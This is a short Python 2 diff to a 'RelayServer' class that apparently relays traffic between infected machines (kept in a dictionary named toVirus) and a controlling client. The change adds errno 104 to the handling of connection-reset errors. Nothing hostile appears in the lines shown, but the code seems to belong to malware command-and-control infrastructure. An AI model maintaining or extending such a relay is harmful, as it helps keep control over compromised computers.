@@ -75,7 +75,7 @@ class RelayServer:
             try:
                 pkt.construct(s)
             except socket.error as error:
-                if error.errno == 10054:
+                if error.errno == 10054 or error.errno == 104:
                     del self.toVirus[address[0]]
                     self.sendIPList()
                     print address[0] + " uninfected or turned computer off!"
@@ -99,7 +99,7 @@ class RelayServer:
             try:
                 pkt.construct(s)
             except socket.error as error:
-                if error.errno == 10054:
+                if error.errno == 10054 or error.errno == 104:
                     del self.toClient[address[0]]
                     print address[0] + " closed client!"
                 else:
